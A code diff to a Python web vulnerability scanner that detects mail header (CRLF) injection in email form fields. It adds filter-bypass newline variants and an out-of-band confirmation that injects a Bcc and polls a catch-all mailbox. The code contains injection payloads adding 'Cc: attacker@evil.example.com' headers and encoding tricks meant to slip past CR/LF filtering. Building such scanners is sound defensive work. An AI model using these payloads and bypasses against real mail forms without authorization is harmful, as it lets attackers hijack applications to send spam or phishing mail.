@@ -2,32 +2,26 @@
 Mail Header Injection Scanner
 Detects CRLF injection in email-related form fields (IPA: 1.8 メールヘッダ・インジェクション).
 
-⚠️ 現在このスキャナは無効化されています（wscan/scanners/__init__.py の SCANNERS
-レジストリから除外済み）。理由:
-  - ブラウザ経由フォーム送信では <input> の value sanitization により CR/LF が
-    除去され、注入そのものが成立しない（CRLF はサーバへ届かない）。
-  - 注入が成立しても、結果は外向きメールのヘッダに現れるため、HTTP レスポンス
-    しか見られない黒box スキャナからは観測できない。
-本格的な検知には OOB(out-of-band) メール受信基盤（自前の IMAP 受信箱、または
-ユニーク宛先を受け取る collaborator ドメイン）を用意し、注入した一意の Cc/Bcc
-宛にメールが届いたかをポーリングする方式が必要。その実装が入るまで本クラスは
-将来の再有効化に備えて残置している（コードは削除しない）。
+検知は 2 層構成:
+  1. **ヒューリスティック**（OOB 不要）… 注入した CR/LF + Cc/Bcc ヘッダが応答へ
+     そのまま反射する、またはメール構築エラーが漏えいする場合に検知する。
+     ブラウザ経由の <input> では value sanitization で CR/LF が落ちることが多いが、
+     URL パラメータや JSON/API 経路では成立し得る。
+  2. **OOB（帯域外）確証**（``WSCAN_OOB_*`` 設定時）… 一意トークン宛の
+     ``Bcc: <token>@<catch-all-domain>`` を注入し、対象アプリが実際に送った
+     メールが OOB 受信箱へ届いたかをポーリングする。届けば「実際に外向きメールの
+     ヘッダへ注入が反映された」確証となり、confidence=confirmed で記録する。
 
-Detection strategy:
-  1. Target only fields whose names suggest they feed into email headers
-     (email, to, from, cc, bcc, subject, reply_to, …).
-  2. Inject CRLF sequences that would add extra headers if unescaped.
-  3. Flag when the server:
-       a. Reflects the raw CRLF in its HTML response (injection not sanitised), OR
-       b. Returns mail-related error messages leaking the injection.
-  Note: confirming the injection actually reached an outbound email is out of scope
-  for a browser-based scanner; this check is inherently heuristic.
+CR/LF が単純除去される素朴な防御に対しては、:func:`wscan.waf_bypass.crlf_bypass_variants`
+が列挙する多様な改行表現（生 CR/LF・パーセント/二重エンコード・Unicode 行区切り・
+オーバーロング UTF-8）でバイパスを試みる。
 """
 import asyncio
 import re
-from typing import TYPE_CHECKING
+from typing import TYPE_CHECKING, Optional
 
 from .base import BaseScanner, Finding
+from ..waf_bypass import crlf_bypass_variants
 
 if TYPE_CHECKING:
     from wscan.engine import ScanEngine
@@ -66,7 +60,8 @@ def _field_name_suggests_mail(field_name: str) -> bool:
             return True
     return False
 
-# Injection payloads — each embeds CRLF variants to split headers
+
+# Injection payloads — each embeds CRLF variants to split headers (反射検知用)
 MAIL_INJECTION_PAYLOADS = [
     "test@example.com\r\nCc: attacker@evil.example.com",
     "test@example.com\nCc: attacker@evil.example.com",
@@ -94,6 +89,42 @@ _REFLECTED_INJECTION_RE = re.compile(
     r"(?:\r\n|\n)\s*(?:Cc|Bcc|To|From):\s*attacker", re.IGNORECASE
 )
 
+# OOB 受信を待つ最大秒数 / ポーリング間隔（OOB 設定時のみ使用）
+OOB_WAIT_SECONDS = 45.0
+OOB_POLL_INTERVAL = 5.0
+
+
+def reflection_payloads() -> list[str]:
+    """反射/エラー検知フェーズで投入するペイロード群（標準 + CRLF バイパス変種）。
+
+    標準セットに加え、``waf_bypass.crlf_bypass_variants`` の改行表現バリエーションで
+    ``Cc: attacker@evil.example.com`` を注入する変種を重複なしで足す（純粋関数）。
+    """
+    out: list[str] = list(MAIL_INJECTION_PAYLOADS)
+    seen = set(out)
+    for payload, _desc in crlf_bypass_variants(
+        "test@example.com", "Cc: attacker@evil.example.com"
+    ):
+        if payload not in seen:
+            seen.add(payload)
+            out.append(payload)
+    return out
+
+
+def oob_payloads(oob_address: str) -> list[str]:
+    """OOB 確証フェーズで投入するペイロード群（純粋関数）。
+
+    一意 OOB アドレス宛の ``Bcc: <addr>`` を、多様な改行表現で注入する。
+    """
+    if not oob_address:
+        return []
+    return [
+        payload
+        for payload, _desc in crlf_bypass_variants(
+            "test@example.com", f"Bcc: {oob_address}"
+        )
+    ]
+
 
 class MailHeaderInjectionScanner(BaseScanner):
     """Mail header injection scanner targeting email-related form fields (IPA 1.8)."""
@@ -114,14 +145,35 @@ class MailHeaderInjectionScanner(BaseScanner):
         if not _field_name_suggests_mail(field_name):
             return []
 
-        findings = []
+        findings: list[Finding] = []
 
         if self.monitor:
             await self.monitor.emit_status(
                 f"Mail header injection testing: {field_name} on {url}"
             )
 
-        for payload in MAIL_INJECTION_PAYLOADS:
+        # ── フェーズ 1: 反射 / エラー漏えいのヒューリスティック検知 ──────────
+        heuristic = await self._scan_reflection(
+            url, form_index, field_name, is_url_param
+        )
+        findings.extend(heuristic)
+
+        # ── フェーズ 2: OOB 確証（WSCAN_OOB_* 設定時のみ） ──────────────────
+        oob = await self._scan_oob(url, form_index, field_name, is_url_param)
+        if oob:
+            findings.append(oob)
+
+        return findings
+
+    async def _scan_reflection(
+        self,
+        url: str,
+        form_index: int,
+        field_name: str,
+        is_url_param: bool,
+    ) -> list[Finding]:
+        """注入した CR/LF + ヘッダの反射、またはメールエラー漏えいを検知する。"""
+        for payload in reflection_payloads():
             await self.log_payload_test(field_name, payload, "mail_header", url)
 
             source, pair = await self._apply_payload(
@@ -141,9 +193,10 @@ class MailHeaderInjectionScanner(BaseScanner):
                     ),
                     pair=pair,
                     severity="high",
+                    confidence="tentative",
+                    evidence_type="mail_header_error",
                 )
-                findings.append(finding)
-                break
+                return [finding] if finding else []
 
             # Check 2: raw CRLF + injected header reflected verbatim in HTML body
             if _REFLECTED_INJECTION_RE.search(source):
@@ -157,11 +210,81 @@ class MailHeaderInjectionScanner(BaseScanner):
                     ),
                     pair=pair,
                     severity="high",
+                    confidence="likely",
+                    evidence_type="mail_header_reflected",
                 )
-                findings.append(finding)
-                break
+                return [finding] if finding else []
 
-        return findings
+        return []
+
+    async def _scan_oob(
+        self,
+        url: str,
+        form_index: int,
+        field_name: str,
+        is_url_param: bool,
+    ) -> Optional[Finding]:
+        """OOB メール受信で注入の実発火を確証する（OOB 未設定なら no-op）。"""
+        new_addr = getattr(self.engine, "new_oob_address", None)
+        if not callable(new_addr):
+            return None
+        issued = new_addr()
+        if not issued:
+            return None
+        token, oob_addr = issued
+
+        last_pair: dict = {}
+        last_payload = ""
+        for payload in oob_payloads(oob_addr):
+            await self.log_payload_test(field_name, payload, "mail_header", url)
+            _source, pair = await self._apply_payload(
+                url, form_index, field_name, payload, is_url_param
+            )
+            last_pair = pair or last_pair
+            last_payload = payload
+            await asyncio.sleep(0.2 * self.sleep_factor)
+
+        if not last_payload:
+            return None
+
+        if self.monitor:
+            await self.monitor.emit_status(
+                f"mail_header: waiting up to {OOB_WAIT_SECONDS:.0f}s for OOB mail ({token})"
+            )
+
+        sink = getattr(self.engine, "oob_sink", None)
+        if sink is None:
+            return None
+        try:
+            received = await asyncio.to_thread(
+                sink.wait_for, token, OOB_WAIT_SECONDS, OOB_POLL_INTERVAL
+            )
+        except Exception as exc:
+            self._note_wave_degradation("mail_oob", exc)
+            return None
+
+        if not received:
+            return None
+
+        return await self.record_finding(
+            url=url,
+            field_name=field_name,
+            payload=last_payload,
+            evidence=(
+                "Mail header injection CONFIRMED via OOB: the application sent an "
+                f"email whose injected Bcc reached the out-of-band mailbox (token {token})."
+            ),
+            pair=last_pair,
+            severity="high",
+            confidence="confirmed",
+            evidence_type="mail_header_oob",
+            evidence_details={
+                "oob_token": token,
+                "oob_address": oob_addr,
+                "received_subject": received.subject,
+                "received_to": received.to_addrs,
+            },
+        )
 
     async def _apply_payload(
         self,
